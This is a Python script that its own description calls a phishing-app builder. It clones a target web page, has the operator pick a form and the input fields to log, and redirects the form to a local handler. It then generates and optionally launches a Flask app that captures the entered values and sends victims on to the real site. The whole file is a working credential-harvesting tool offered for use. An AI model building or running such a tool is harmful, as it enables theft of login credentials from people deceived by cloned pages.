#!/usr/bin/env python

import sys
import os
import shutil
import urllib2

from bs4 import BeautifulSoup


def relative_root(url):
    if '?' in url:
        url = url[:url.find('?')]
    if url.count('/') == 2:
        return url + '/'
    else:
        return url[:url.rfind('/')] + '/'


def absolute_root(url):
    if '?' in url:
        url = url[:url.find('?')]
    if url.count('/') == 2:
        return url
    else:
        return url[:url.find('/',8)]


def relative_to_absolute(url, link):
    if link.startswith('http://') or link.startswith('https://') or link.startswith('data:'):
        # already absolute, skipping
        return link
    if link.startswith('//'):
        # just add protocol
        link = 'http:' + link
        return link
    if link[0] == '/':
        # Absolute URL
        link = absolute_root(url) + link
        return link
    else:
        # Relative URL
        link = relative_root(url) + link
        return link


def download_page(url, target):
    html = urllib2.urlopen(url).read()
    soup = BeautifulSoup(html, 'lxml')
    for elem in soup.find_all():
        if elem.get('src', None):
            elem['src'] = relative_to_absolute(url, elem['src'])
        if elem.get('href', None):
            elem['href'] = relative_to_absolute(url, elem['href'])
    with open(target, "w") as f:
        f.write(soup.encode_contents())


def edit_page(filename):
    original_page = open(filename, 'r').read()
    soup = BeautifulSoup(original_page, 'lxml')
    forms = soup.find_all('form')
    print "[*] Found forms:"
    i = 0
    for f in forms:
        print "FORM " + str(i) + " --> " +  f.get('action', 'None')
        i += 1
    while True:
        try:
            i = int(raw_input('Form to log: '))
        except ValueError:
            print "Enter the form number"
        try:
            f = forms[i]
            break
        except IndexError:
            print "Invalid form number"
    print "Selected form " + str(i) + '\n'
    f['action'] = "/form"
    loggable = []
    for i in  f.find_all('input'):
        if i.get('name'):
            loggable.append(i['name'])
    while True:
        print "[*] Form fields:"
        for i in range(len(loggable)):
            print str(i) + " - " + loggable[i]
        input_params = raw_input('Fields to log (comma separated, e.g 1,4,5): ').split(',')
        to_log = []
        try:
            for i in input_params:
                to_log.append(loggable[int(i)])
            break
        except:
            print "Invalid format: use form field identifiers (e.g 1,4,5)"
    print 'Logging: ' + str(to_log) + '\n'
    with open('index.html', "w") as f:
        f.write(soup.encode_contents())
    return to_log


def generate_phisher(to_log, url):
    payload = open('template_app/app.py', 'r').read()
    payload = payload.replace('__TO_LOG__', str(to_log))
    payload = payload.replace('__REDIRECT_URL__', url)
    with open('app.py', 'w') as f:
        f.write(payload)


def main(args):
    url = args.url
    if not url.startswith('http://') and not url.startswith('https://'):
        url = 'http://' + url
    download_page(url, 'page.html')
    to_log = edit_page('page.html')
    os.remove('page.html')
    generate_phisher(to_log, url)
    output_dir = 'app'
    if os.path.exists(output_dir):
        shutil.rmtree(output_dir)
    os.makedirs(output_dir + '/templates')
    shutil.move('app.py', output_dir)
    shutil.move('index.html', output_dir + '/templates')
    shutil.copy('template_app/run.sh', output_dir)
    print "[*] Phishing page ready !"
    runnow = raw_input("Run now ? (y/n)")
    if runnow == 'y':
        os.system("app/run.sh")

if __name__ == '__main__':
    from argparse import ArgumentParser
    parser = ArgumentParser(description="Builds a phishing Flask application.")
    parser.add_argument('url', help="The URL of the page to copy")
    args = parser.parse_args()
    main(args)
